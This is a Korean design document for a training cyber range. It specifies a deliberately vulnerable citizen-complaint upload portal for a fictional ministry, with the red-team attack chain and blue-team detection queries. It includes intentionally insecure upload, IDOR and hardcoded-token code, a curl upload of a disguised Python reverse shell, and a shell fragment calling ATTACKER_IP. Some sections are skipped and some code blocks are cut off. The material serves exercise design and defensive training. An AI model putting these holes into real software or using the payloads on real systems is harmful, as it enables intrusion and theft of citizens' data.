## 1. 개요

### 1.1 자산 목적

민원 접수 서버는 가상국가 발도리아(Valdoria)의 행정안전부(MOIS) 소속 민원 접수 포털로, 시민이 웹 브라우저를 통해 민원을 작성하고 첨부파일을 업로드하며 처리 상태를 조회할 수 있는 공개 서비스이다.

### 1.2 훈련 내 역할

> **이 자산은 전체 사이버 훈련의 최초 침투 벡터(PRIMARY INITIAL COMPROMISE VECTOR)이다.**

레드팀은 이 서버의 파일 업로드 기능에 존재하는 의도적 취약점을 이용하여 악성 파일을 업로드하고, 해당 파일이 내부망(INT)의 민원 처리 서버(192.168.100.12)에서 처리(변환)되는 과정에서 원격 코드 실행(RCE)을 달성한다. 이후 내부 네트워크 횡이동(lateral movement)의 교두보로 활용된다.

### 1.3 공격 체인 내 위치

```
[공격자]
    │
    ▼
[민원 접수 서버 (DMZ, 203.238.140.12)]  ◀── STEP 1: 파일 업로드 취약점 악용
    │  악성 파일이 MinIO에 저장
    │  Redis 큐를 통해 처리 요청 전달
    ▼
[민원 처리 서버 (INT, 192.168.100.12)]   ◀── STEP 2: 파일 변환 시 코드 실행
    │  LibreOffice/Pillow 취약점으로 RCE
    ▼
[내부 네트워크 횡이동]                    ◀── STEP 3: 피벗 및 추가 공격
```

민원 접수 서버 자체에서는 직접적인 코드 실행이 발생하지 않으나, 공격자가 악성 페이로드를 내부망으로 전달하는 **유일한 진입 경로**이므로 가장 중요한 자산이다.

### 3.2 데이터 흐름 (파일 업로드)

```
1. 사용자가 브라우저에서 민원 작성 및 파일 첨부
       │
       ▼
2. Nginx가 HTTPS 요청 수신 → FastAPI(:8000)로 프록시
       │
       ▼
3. FastAPI가 파일 검증 수행 (의도적으로 불완전한 검증)
   - 파일 확장자만 확인 (.pdf, .jpg, .png, .docx 허용)
   - Content-Type 헤더를 신뢰 (클라이언트 제공 값 그대로 사용)
   - 매직 바이트(file signature) 미검증
       │
       ▼
4. MinIO에 파일 저장 (bucket: complaints/{complaint_id}/{filename})
       │
       ▼
5. Redis 큐에 처리 요청 메시지 발행
   { "complaint_id": "...", "file_key": "...", "action": "convert" }
       │
       ▼
6. 민원 처리 서버(INT)가 Redis 구독 → MinIO에서 파일 다운로드 → 변환 처리
   ◀── LibreOffice/Pillow가 악성 파일을 처리하며 코드 실행 발생
```

### 4.3 방화벽 규칙 (ufw)

```bash
# 인바운드
ufw allow from any to any port 80 proto tcp        # HTTP (공개)
ufw allow from any to any port 443 proto tcp       # HTTPS (공개)
ufw allow from 192.168.100.0/24 to any port 9000 proto tcp  # MinIO API (INT 서버만)
ufw deny from any to any port 8000 proto tcp       # FastAPI 직접 접근 차단
ufw deny from any to any port 9001 proto tcp       # MinIO 콘솔 외부 차단

# 아웃바운드
ufw allow out to 192.168.100.0/24 port 6379 proto tcp  # Redis (INT 구간)
```

## 6. API/서비스 명세

### 6.1 엔드포인트 목록

모든 API는 `/api` 접두사를 사용하며, Nginx가 `/api/*` 경로를 FastAPI(:8000)로 프록시한다.

---

#### 6.1.1 POST /api/complaint/submit

**목적:** 새 민원 접수 (텍스트 정보만)

| 항목 | 내용 |
|------|------|
| 인증 | 없음 (공개 API) |
| Content-Type | application/json |

**요청 본문:**
```json
{
  "title": "도로 파손 신고",
  "category": "infrastructure",
  "content": "발도리아 중앙로 120번지 앞 도로 파손...",
  "submitter_name": "홍길동",
  "submitter_phone": "010-1234-5678",
  "submitter_email": "hong@example.com"
}
```

**응답 (201 Created):**
```json
{
  "complaint_id": "COMP-2026-00142",
  "status": "received",
  "created_at": "2026-03-26T09:30:00Z",
  "message": "민원이 정상적으로 접수되었습니다."
}
```

---

#### 6.1.2 POST /api/complaint/upload -- [취약]

**목적:** 민원 첨부파일 업로드

| 항목 | 내용 |
|------|------|
| 인증 | 없음 (공개 API) |
| Content-Type | multipart/form-data |
| 최대 파일 크기 | 50MB |

**요청 파라미터:**

| 필드 | 타입 | 필수 | 설명 |
|------|------|------|------|
| complaint_id | string | Y | 민원 ID |
| file | UploadFile | Y | 첨부파일 |

**응답 (200 OK):**
```json
{
  "file_id": "f7a8b3c2-...",
  "filename": "evidence_photo.pdf",
  "size": 1048576,
  "upload_time": "2026-03-26T09:31:00Z",
  "status": "uploaded"
}
```

**취약점:** 파일 확장자 검증이 불완전하며, Content-Type을 클라이언트 제공 값 그대로 신뢰한다. 상세 내용은 섹션 8.1 참조.

---

#### 6.1.3 GET /api/complaint/{id} -- [취약]

**목적:** 민원 상태 조회

| 항목 | 내용 |
|------|------|
| 인증 | 없음 (complaint_id만으로 조회 가능) |

**응답 (200 OK):**
```json
{
  "complaint_id": "COMP-2026-00142",
  "title": "도로 파손 신고",
  "status": "processing",
  "submitter_name": "홍길동",
  "submitter_phone": "010-1234-5678",
  "files": [
    {
      "file_id": "f7a8b3c2-...",
      "filename": "evidence_photo.pdf",
      "download_url": "/api/complaint/COMP-2026-00142/download?file_id=f7a8b3c2-..."
    }
  ],
  "created_at": "2026-03-26T09:30:00Z",
  "updated_at": "2026-03-26T10:15:00Z"
}
```

**취약점:** complaint_id가 순차적(COMP-2026-XXXXX)이므로 다른 사용자의 민원 정보(이름, 전화번호 포함)를 열람할 수 있다. 섹션 8.3 참조.

---

#### 6.1.4 GET /api/complaint/{id}/download -- [취약]

**목적:** 첨부파일 다운로드 (MinIO presigned URL 리다이렉트)

| 항목 | 내용 |
|------|------|
| 인증 | 없음 |
| 쿼리 파라미터 | file_id (string) |

**응답 (302 Redirect):**
```
Location: http://203.238.140.12:9000/complaints/COMP-2026-00142/evidence_photo.pdf?X-Amz-...
```

**취약점:** presigned URL 생성 시 요청자와 민원 소유자의 일치 여부를 검증하지 않는다. 섹션 8.3 참조.

---

#### 6.1.5 GET /api/complaints -- [취약]

**목적:** 민원 목록 조회

| 항목 | 내용 |
|------|------|
| 인증 | 부분적 (X-Admin-Token 헤더 검사하나 하드코딩된 토큰) |
| 쿼리 파라미터 | page, per_page, status |

**응답 (200 OK):**
```json
{
  "total": 142,
  "page": 1,
  "per_page": 20,
  "complaints": [
    {
      "complaint_id": "COMP-2026-00142",
      "title": "도로 파손 신고",
      "status": "processing",
      "created_at": "2026-03-26T09:30:00Z"
    }
  ]
}
```

**취약점:** 관리자 토큰이 소스코드에 하드코딩(`admin-token-mois-2026`)되어 있으며, 토큰 없이도 요청 시 일부 필드가 반환된다.

## 7. 사용자/계정 설정

### 7.1 시스템 계정

| 계정 | 용도 | 셸 | 홈 디렉토리 |
|------|------|------|-----------|
| minwon | FastAPI 실행 사용자 | /bin/bash | /opt/minwon |
| minio-user | MinIO 실행 사용자 | /usr/sbin/nologin | /opt/minio |
| www-data | Nginx 실행 사용자 | 기본 | 기본 |

### 7.2 MinIO 자격증명

```
MINIO_ROOT_USER=minio_access
MINIO_ROOT_PASSWORD=minio_secret123
```

> **의도적 취약 설정:** MinIO root 자격증명이 .env 파일에 평문으로 저장되며, API 서비스에서도 동일한 root 자격증명을 사용한다. 별도의 제한된 서비스 계정을 생성하지 않았다.

### 7.3 API 인증

| 구분 | 방식 | 비고 |
|------|------|------|
| 민원 접수/조회 | 인증 없음 | 공개 서비스 |
| 파일 업로드 | 인증 없음 | complaint_id만 필요 |
| 민원 목록 | X-Admin-Token 헤더 | 하드코딩: `admin-token-mois-2026` |
| MinIO 콘솔 | root 계정 | 위 자격증명 동일 |

### 7.4 환경변수 (.env.example)

```bash
# === FastAPI ===
COMPLAINT_API_URL=http://203.238.140.12:8000
API_HOST=0.0.0.0
API_PORT=8000
API_LOG_LEVEL=info
ADMIN_TOKEN=admin-token-mois-2026

# === MinIO ===
MINIO_ENDPOINT=203.238.140.12:9000
MINIO_ACCESS_KEY=minio_access
MINIO_SECRET_KEY=minio_secret123
MINIO_BUCKET=complaints
MINIO_SECURE=false

# === Redis (INT 구간) ===
REDIS_HOST=192.168.100.10

REDIS_QUEUE=complaint_processing
```

## 8. 의도적 취약점 설계

> **중요:** 이 섹션은 훈련 목적의 의도적 취약점이다. 각 취약점은 레드팀 공격 시나리오 STEP 1~3에 대응하며, 블루팀이 탐지해야 할 핵심 포인트를 포함한다.

### 8.1 취약점 #1: 파일 업로드 확장자 우회 (File Extension Bypass)

**CWE:** CWE-434 (Unrestricted Upload of File with Dangerous Type)

**공격 시나리오:** 공격자가 이중 확장자(double extension) 파일명을 사용하여 허용 목록을 우회한다.

**취약 코드 (src/backend/routers/complaint.py):**

```python
import os
from fastapi import APIRouter, UploadFile, File, Form, HTTPException

router = APIRouter(prefix="/api/complaint")

ALLOWED_EXTENSIONS = [".pdf", ".jpg", ".jpeg", ".png", ".docx", ".xlsx"]

@router.post("/upload")
async def upload_file(
    complaint_id: str = Form(...),
    file: UploadFile = File(...)
):
    # [취약] 파일명의 마지막 부분만으로 확장자 검사
    # "shell.pdf.py"에서 ".py"를 추출하지 못하고
    # ".pdf"가 파일명에 포함되어 있으면 통과시키는 로직
    filename = file.filename
    file_ext = os.path.splitext(filename)[1].lower()

    # [취약 핵심] splitext는 마지막 확장자만 반환하지만,
    # 아래 검증은 "허용 확장자 중 하나가 파일명에 포함되어 있는지"만 확인
    allowed = False
    for ext in ALLOWED_EXTENSIONS:
        if ext in filename.lower():
            allowed = True
            break

    if not allowed:
        raise HTTPException(status_code=400, detail="허용되지 않는 파일 형식입니다.")

    # 파일 크기 검사 (이것은 정상 동작)
    contents = await file.read()
    if len(contents) > 50 * 1024 * 1024:
        raise HTTPException(status_code=413, detail="파일 크기가 50MB를 초과합니다.")

    # MinIO에 저장 - 원본 파일명 그대로 사용
    file_key = f"{complaint_id}/{filename}"
    await storage_service.upload(
        bucket="complaints",
        key=file_key,
        data=contents,
        content_type=file.content_type  # [취약] 클라이언트 제공 Content-Type 그대로 사용
    )

    # Redis 큐에 처리 요청 발행
    await queue_service.publish("complaint_processing", {
        "complaint_id": complaint_id,
        "file_key": file_key,
        "filename": filename,
        "content_type": file.content_type,
        "action": "convert"
    })

    return {
        "file_id": generate_file_id(),
        "filename": filename,
        "size": len(contents),
        "status": "uploaded"
    }
```

**공격 방법:**

```bash
# 이중 확장자를 사용한 Python 리버스 셸 업로드
curl -X POST https://minwon.mois.valdoria.gov/api/complaint/upload \
  -F "complaint_id=COMP-2026-00142" \
  -F "file=@shell.pdf.py;type=application/pdf"
```

파일명 `shell.pdf.py`에 `.pdf`가 포함되어 있으므로 확장자 검증을 통과하며, 실제로는 `.py` 파일이 MinIO에 저장된다.

**수정된(안전한) 코드 — 참고용:**

```python
# 올바른 검증: 최종 확장자만 추출하고, 매직 바이트도 검증
file_ext = os.path.splitext(filename)[1].lower()
if file_ext not in ALLOWED_EXTENSIONS:
    raise HTTPException(status_code=400, detail="허용되지 않는 파일 형식입니다.")

# 매직 바이트 검증
import magic
mime = magic.from_buffer(contents[:2048], mime=True)
if mime not in ALLOWED_MIMES:
    raise HTTPException(status_code=400, detail="파일 내용이 형식과 일치하지 않습니다.")
```

### 8.2 취약점 #2: Content-Type 조작 (Content-Type Manipulation)

**CWE:** CWE-345 (Insufficient Verification of Data Authenticity)

**공격 시나리오:** 공격자가 HTTP 요청의 Content-Type을 조작하여 악성 파일을 정상 문서로 위장한다.

**취약 코드 (src/backend/services/storage.py):**

```python
import boto3
from botocore.client import Config

class StorageService:
    def __init__(self):
        self.client = boto3.client(
            "s3",
            endpoint_url=f"http://{MINIO_ENDPOINT}",
            aws_access_key_id=MINIO_ACCESS_KEY,
            aws_secret_access_key=MINIO_SECRET_KEY,
            config=Config(signature_version="s3v4")
        )

    async def upload(self, bucket: str, key: str, data: bytes, content_type: str):
        # [취약] content_type을 검증 없이 그대로 메타데이터로 저장
        # 공격자가 "application/pdf"로 지정하면
        # 실제 파일 내용과 무관하게 PDF로 분류됨
        self.client.put_object(
            Bucket=bucket,
            Key=key,
            Body=data,
            ContentType=content_type,  # 클라이언트 제공 값 그대로
            Metadata={
                "original-content-type": content_type,  # 로그/감사용으로도 조작된 값 기록
            }
        )
```

**공격 방법:**

```bash

s.connect(("ATTACKER_IP",4444))
```

민원 처리 서버(INT)에서 이 파일을 다운로드할 때 Content-Type이 `application/pdf`이므로 PDF 처리 파이프라인으로 전달되나, 실제 내용은 Python 스크립트이다. LibreOffice의 매크로 처리 또는 Pillow의 이미지 파싱 과정에서 취약점이 트리거될 수 있다.

### 8.3 취약점 #3: Presigned URL IDOR (안전하지 않은 직접 객체 참조)

**CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key)

**공격 시나리오:** 민원 ID를 순차적으로 열거하여 다른 사용자의 첨부파일에 접근한다.

**취약 코드 (src/backend/routers/complaint.py):**

```python
@router.get("/{complaint_id}")
async def get_complaint(complaint_id: str):
    # [취약] 요청자와 민원 소유자의 일치 여부를 검증하지 않음
    # complaint_id만 알면 누구나 조회 가능
    complaint = await db.get_complaint(complaint_id)
    if not complaint:
        raise HTTPException(status_code=404, detail="민원을 찾을 수 없습니다.")

    # 민원 정보에 개인정보(이름, 전화번호)가 포함되어 반환됨
    return complaint


@router.get("/{complaint_id}/download")
async def download_file(complaint_id: str, file_id: str):
    # [취약] 소유권 검증 없이 presigned URL 생성
    complaint = await db.get_complaint(complaint_id)
    if not complaint:
        raise HTTPException(status_code=404, detail="민원을 찾을 수 없습니다.")

    file_info = next(
        (f for f in complaint["files"] if f["file_id"] == file_id),
        None
    )
    if not file_info:
        raise HTTPException(status_code=404, detail="파일을 찾을 수 없습니다.")

    # [취약] 누구나 접근 가능한 presigned URL 생성
    presigned_url = storage_service.client.generate_presigned_url(
        "get_object",
        Params={
            "Bucket": "complaints",
            "Key": f"{complaint_id}/{file_info['filename']}"
        },
        ExpiresIn=3600  # 1시간 유효
    )

    # [취약] presigned URL에 IP 제한이나 추가 인증 없음
    return RedirectResponse(url=presigned_url)
```

### 8.4 취약점 #4: 파일 처리 체인을 통한 원격 코드 실행

**CWE:** CWE-94 (Improper Control of Generation of Code)

**공격 체인 전체 흐름:**

```
┌─ 민원 접수 서버 (203.238.140.12) ─────────────────────────────────┐
│                                                                    │
│  1. 공격자가 shell.pdf.py 업로드                                    │
│     - 확장자 검증 우회 (취약점 #1)                                  │
│     - Content-Type: application/pdf (취약점 #2)                    │
│                                                                    │
│  2. MinIO에 저장: complaints/COMP-2026-00142/shell.pdf.py          │
│                                                                    │
│  3. Redis 큐에 메시지 발행:                                         │
│     {                                                              │
│       "complaint_id": "COMP-2026-00142",                           │
│       "file_key": "COMP-2026-00142/shell.pdf.py",                  │
│       "content_type": "application/pdf",                           │
│       "action": "convert"                                          │
│     }                                                              │
└────────────────────────────┬───────────────────────────────────────┘
                             │ Redis publish
                             ▼
┌─ 민원 처리 서버 (192.168.100.12) ─────────────────────────────────┐
│                                                                    │
│  4. Redis 구독 → 새 작업 수신                                       │
│                                                                    │
│  5. MinIO에서 파일 다운로드                                         │
│     - content_type이 "application/pdf"이므로 PDF 변환 파이프라인     │
│                                                                    │
│  6. LibreOffice로 PDF → 이미지 변환 시도                            │
│     또는 Pillow로 이미지 처리 시도                                   │
│     - 악성 페이로드가 처리 과정에서 실행됨                           │
│     - CVE 취약점 또는 매크로 실행으로 RCE 달성                      │
│                                                                    │
│  7. 리버스 셸 연결 → 공격자가 INT 네트워크 접근 권한 획득           │
└────────────────────────────────────────────────────────────────────┘
```

**핵심 포인트:** 민원 접수 서버는 파일을 저장하고 큐에 넣기만 할 뿐, 직접적인 코드 실행은 발생하지 않는다. 실제 RCE는 INT 구간의 민원 처리 서버에서 파일 변환 과정 중 발생한다. 민원 접수 서버의 역할은 **악성 파일을 내부망으로 전달하는 통로**이다.

**큐 발행 코드 (src/backend/services/queue.py):**

```python
import json
import redis

class QueueService:
    def __init__(self):
        self.redis_client = redis.Redis(
            host=REDIS_HOST,      # 192.168.100.10
            port=REDIS_PORT,      # 6379
            decode_responses=True
        )

    async def publish(self, queue_name: str, message: dict):
        # [취약] 파일 메타데이터를 검증 없이 그대로 큐에 전달
        # content_type, filename 등이 공격자 조작 값 그대로 전파
        self.redis_client.lpush(
            queue_name,
            json.dumps(message)
        )

        # 업로드 이벤트 로깅 (블루팀 탐지 포인트)
        self.redis_client.lpush(
            "upload_events",
            json.dumps({
                "timestamp": datetime.utcnow().isoformat(),
                "complaint_id": message["complaint_id"],
                "filename": message.get("filename"),
                "content_type": message.get("content_type"),
                "file_key": message["file_key"]
            })
        )
```

### 9.2 탐지 가능 지표 (IoC)

#### 9.2.1 이중 확장자 파일 업로드

**탐지 대상:** 파일명에 허용 확장자가 포함되어 있으나 최종 확장자가 실행 가능한 형식인 경우

```
# upload.log에서 이중 확장자 탐지
# 패턴: *.{허용확장자}.{실행가능확장자}
grep -P '\.(pdf|jpg|png|docx)\.(py|sh|bash|php|jsp|exe|bat|ps1|pl)' /var/log/minwon/upload.log
```

**SIEM 탐지 쿼리 (Splunk SPL 예시):**

```spl
index=minwon sourcetype=upload_log
| rex field=filename "\.(?<first_ext>\w+)\.(?<last_ext>\w+)$"
| where last_ext IN ("py","sh","bash","php","jsp","exe","bat","ps1","pl","rb")
| table _time complaint_id filename content_type src_ip
```

#### 9.2.2 Content-Type 불일치

**탐지 대상:** 업로드된 파일의 실제 내용(매직 바이트)과 선언된 Content-Type이 불일치하는 경우

```spl
index=minwon sourcetype=upload_log
| where content_type="application/pdf" AND NOT match(filename, "\.(pdf)$")
| table _time complaint_id filename content_type src_ip
```

#### 9.2.3 Presigned URL 비정상 접근

**탐지 대상:** 화이트리스트에 없는 IP에서 presigned URL로 MinIO 객체에 접근하는 경우

```spl
index=minio sourcetype=audit_log method=GET
| where NOT cidrmatch("203.238.140.0/24", src_ip)
  AND NOT cidrmatch("192.168.100.0/24", src_ip)
| rex field=request_uri "complaints/(?<target_complaint>[^/]+)/"
| stats count by src_ip target_complaint
| where count > 5
| table src_ip target_complaint count
```

#### 9.2.4 민원 ID 열거 시도

**탐지 대상:** 단일 IP에서 짧은 시간 내 다수의 민원 ID를 순차적으로 조회하는 경우

```spl
index=minwon sourcetype=nginx_access uri="/api/complaint/COMP-*"
| rex field=uri "/api/complaint/(?<complaint_id>COMP-\d{4}-\d{5})"
| bin _time span=5m
| stats dc(complaint_id) as unique_ids count by src_ip _time
| where unique_ids > 10
| table _time src_ip unique_ids count
```

#### 9.2.5 대용량/다량 파일 업로드

```spl
index=minwon sourcetype=upload_log
| bin _time span=10m
| stats count sum(file_size) as total_bytes by src_ip _time
| where count > 5 OR total_bytes > 104857600
| table _time src_ip count total_bytes
```

```bash
ufw allow 80/tcp
ufw allow 443/tcp
```

#### 11.4.3 FileUploader (핵심 컴포넌트)

| 속성 | 내용 |
|------|------|
| 파일 | `src/components/FileUpload.jsx` |
| 의존성 | `react-dropzone` |
| Props | `onFilesChange(files)`, `maxSize` (기본 50MB), `acceptedFormats` (표시용 문자열) |
| 내부 상태 | `files[]`, `isDragActive`, `uploadProgress{}` |

**컴포넌트 구조:**

```jsx
// src/components/FileUpload.jsx (의도적 취약 구현)
import { useDropzone } from 'react-dropzone';
import axios from 'axios';

function FileUploader({ complaintId, onUploadComplete }) {
  const [files, setFiles] = useState([]);
  const [uploadProgress, setUploadProgress] = useState({});

  const onDrop = useCallback((acceptedFiles) => {
    // [취약] 프론트엔드에서 실질적 파일 검증 없음
    // react-dropzone의 accept 옵션을 사용하지 않음
    // 파일 확장자만 UI 라벨에 표시할 뿐 실제 검증하지 않음
    setFiles(prev => [...prev, ...acceptedFiles.map(f => ({
      file: f,
      name: f.name,
      size: f.size,
      type: f.type,
      progress: 0,
      status: 'pending'
    }))]);
  }, []);

  const { getRootProps, getInputProps, isDragActive } = useDropzone({
    onDrop,
    // [취약] accept 필터 미설정 — 모든 파일 허용
    // accept: { 'application/pdf': ['.pdf'], ... } 를 의도적으로 생략
    maxSize: 50 * 1024 * 1024,
  });

  const uploadFile = async (fileItem, index) => {
    const formData = new FormData();
    formData.append('complaint_id', complaintId);
    formData.append('file', fileItem.file);
    // [취약] 원본 파일을 재인코딩 없이 그대로 전송
    // Content-Type도 브라우저가 감지한 값 그대로 전송

    try {
      const response = await axios.post('/api/complaint/upload', formData, {
        headers: { 'Content-Type': 'multipart/form-data' },
        onUploadProgress: (e) => {
          const percent = Math.round((e.loaded * 100) / e.total);
          setUploadProgress(prev => ({ ...prev, [index]: percent }));
        },
      });
      // 업로드 성공 처리
    } catch (error) {
      // 에러 처리
    }
  };

  return (
    <div>
      <div {...getRootProps()} className={dropzoneStyles}>
        <input {...getInputProps()} />
        {isDragActive ? (
          <p>여기에 파일을 놓으세요</p>
        ) : (
          <p>파일을 이곳에 끌어다 놓거나 클릭하여 선택하세요</p>
        )}
        <p className="text-sm text-gray-500">
          지원 형식: PDF, HWP, DOC, DOCX, JPG, PNG | 최대 50MB
        </p>
      </div>
      {/* 파일 목록 */}
      {files.map((f, i) => (
        <FileListItem
          key={i}
          file={f}
          progress={uploadProgress[i]}
          onRemove={() => removeFile(i)}
        />
      ))}
    </div>
  );
}
```

**단계 전환 로직:**

```javascript
const goNext = () => {
  if (validateCurrentStep()) {
    setCurrentStep(prev => Math.min(prev + 1, 4));
  }
};
const goPrev = () => setCurrentStep(prev => Math.max(prev - 1, 1));

const validateCurrentStep = () => {
  switch (currentStep) {
    case 1: return formData.category !== '';
    case 2: return formData.title.length >= 5
```

**민원 제출 함수:**

```javascript
// src/api/complaint.js
import apiClient from './client';

// 1단계: 민원 텍스트 정보 제출
export const submitComplaint = async (data) => {
  const response = await apiClient.post('/complaint/submit', {
    title: data.title,
    category: data.category,
    content: data.content,
    submitter_name: data.submitter_name,
    submitter_phone: data.submitter_phone,
    submitter_email: data.submitter_email,
  });
  return response.data;  // { complaint_id, status, ... }
};

// 2단계: 파일 업로드 (각 파일별 개별 호출)
export const uploadFile = async (complaintId, file, onProgress) => {
  const formData = new FormData();
  formData.append('complaint_id', complaintId);
  formData.append('file', file);  // [취약] 원본 파일 그대로 전송

  const response = await apiClient.post('/complaint/upload', formData, {
    headers: { 'Content-Type': 'multipart/form-data' },
    onUploadProgress: (e) => {
      if (onProgress) onProgress(Math.round((e.loaded * 100) / e.total));
    },
  });
  return response.data;  // { file_id, filename, size, status }
};

// 민원 상태 조회
export const getComplaint = async (complaintId) => {
  const response = await apiClient.get(`/complaint/${complaintId}`);
  return response.data;
};
```

#### 11.6.3 에러 처리

```javascript
// react-toastify를 사용한 토스트 알림
import { toast } from 'react-toastify';

// 사용 예시
const handleSubmit = async () => {
  setSubmitting(true);
  try {
    // 민원 제출
    const result = await submitComplaint(formData);

    // 파일 업로드
    for (const file of formData.files) {
      await uploadFile(result.complaint_id, file.file, (progress) => {
        setUploadProgress(prev => ({ ...prev, [file.name]: progress }));
      });
    }

    setResult(result);
    toast.success('민원이 정상적으로 접수되었습니다.');
  } catch (error) {
    if (error.response?.status === 413) {
      toast.error('파일 크기가 50MB를 초과합니다.');
    } else if (error.response?.status === 400) {
      toast.error(error.response.data.detail || '입력 정보를 확인해 주세요.');
    } else {
      toast.error('서버 오류가 발생했습니다. 잠시 후 다시 시도해 주세요.');
    }
  } finally {
    setSubmitting(false);
  }
};
```

#### 11.8.3 클라이언트 측 파일 검증 부재

**취약 사항:** 프론트엔드에서 파일 내용을 검증하지 않는다.

| 검증 항목 | 구현 여부 | 설명 |
|-----------|----------|------|
| 파일 확장자 필터 (react-dropzone accept) | 미구현 | `accept` 옵션 미설정, 모든 파일 허용 |
| 파일 확장자 체크 (JavaScript) | 미구현 | `onDrop`에서 확장자 검증 로직 없음 |
| MIME 타입 검증 | 미구현 | `file.type` 값을 확인하지 않음 |
| 매직 바이트 검증 (FileReader) | 미구현 | 파일 헤더를 읽어 실제 형식을 확인하지 않음 |
| 파일 크기 제한 | 구현됨 | react-dropzone `maxSize: 50MB` (유일한 검증) |

**UI에 표시되는 안내문과 실제 동작의 괴리:**
- UI 안내: "지원 형식: PDF, HWP, DOC, DOCX, JPG, PNG"
- 실제 동작: **모든 파일 형식 허용** (텍스트는 단순 안내문일 뿐 실제 필터링 없음)

#### 11.8.4 Presigned URL 패턴 예측 가능

**취약 사항:** 민원 상세 페이지의 다운로드 URL 구조가 JavaScript 코드에서 확인 가능하다.

```javascript
// StatusDetailPage.jsx 코드에서 URL 패턴 확인 가능:
//   /api/complaint/{complaint_id}/download?file_id={file_id}
//
// complaint_id는 순차적(COMP-2026-XXXXX)이므로
// 공격자가 다른 사용자의 파일도 다운로드 가능 (IDOR)
```

#### 11.8.5 관리자 토큰 노출 가능성

**취약 사항:** 프론트엔드 코드에 관리자 API 호출 흔적이 남아있을 수 있다.

```javascript
// [취약] 개발 과정에서 남은 주석 또는 미사용 코드
// src/api/client.js 또는 번들에 포함될 수 있는 코드:
//
// const ADMIN_TOKEN = 'admin-token-mois-2026';
// headers: { 'X-Admin-Token': ADMIN_TOKEN }
//
// 또는 localStorage에 저장된 토큰:
// localStorage.setItem('admin_token', 'admin-token-mois-2026');
```

**공격자 활용:**
1. 브라우저 개발자도구 Application 탭 → localStorage 확인
2. 번들 JS 파일에서 `admin-token` 또는 `X-Admin-Token` 문자열 검색
3. 발견된 토큰으로 `GET /api/complaints` (전체 민원 목록) 접근
